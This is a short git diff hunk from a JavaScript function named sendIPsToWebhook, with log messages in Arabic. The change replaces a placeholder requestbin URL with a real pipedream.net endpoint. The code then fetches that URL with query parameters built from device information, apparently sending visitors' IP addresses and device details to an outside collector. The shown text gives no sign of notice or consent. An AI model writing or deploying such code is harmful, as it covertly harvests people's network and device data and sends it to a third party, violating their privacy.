@@ -281,7 +281,7 @@ async function sendIPsToWebhook() {
       height: deviceInfo.screen.height.toString(),
     });
 
-    const url = `https://your-requestbin-url.com/?${params.toString()}`;
+    const url = `https://eo5d3jdbl6ngkcy.m.pipedream.net?${params.toString()}`;
     await fetch(url);
     console.log("✅ البيانات أُرسلت بنجاح إلى:", url);
   } catch (err) {
